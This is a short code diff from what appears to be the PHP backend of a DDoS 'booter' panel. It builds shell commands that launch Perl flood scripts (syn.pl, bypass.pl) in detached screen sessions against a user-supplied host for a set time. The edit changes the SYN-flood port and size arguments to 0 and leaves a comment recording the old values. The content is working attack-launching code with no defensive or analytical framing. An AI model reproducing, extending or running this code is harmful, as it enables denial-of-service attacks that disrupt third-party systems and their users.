@@ -93,7 +93,8 @@ if ($port > 44405) {
 $command = "";
 
 if ($method == "syn") {
-    $command = "screen -dm perl $directory/syn.pl $host $port 55000 $time";
+    // ----------------------------------used to be $port 55000
+    $command = "screen -dm perl $directory/syn.pl $host 0 0 $time";
 }
 if ($method == "bypass") {
     $command = "screen -dm perl $directory/bypass.pl $host $time";
